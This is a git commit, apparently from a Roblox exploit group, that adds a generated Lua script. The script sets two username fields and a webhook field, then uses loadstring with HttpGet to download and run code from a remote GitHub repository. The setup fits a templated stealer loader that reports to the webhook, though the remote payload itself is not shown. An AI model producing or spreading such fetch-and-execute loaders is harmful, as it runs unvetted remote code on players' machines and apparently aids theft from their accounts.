a7e1af3b2ce69008a1919b7f6730aaeb92b02b3b
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 16:48:08 +0200

    Add generated script

---
+++ scripts/thebotaura.lua
@@ -0,0 +1,7 @@
+
+Username = "dabird"
+Username2 = "dabird"
+Webhook = "https.com"
+
+-- The rest of the code stays constant, and only the three fields above are updated dynamically
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/main/scripts/thebotaura.lua"))()
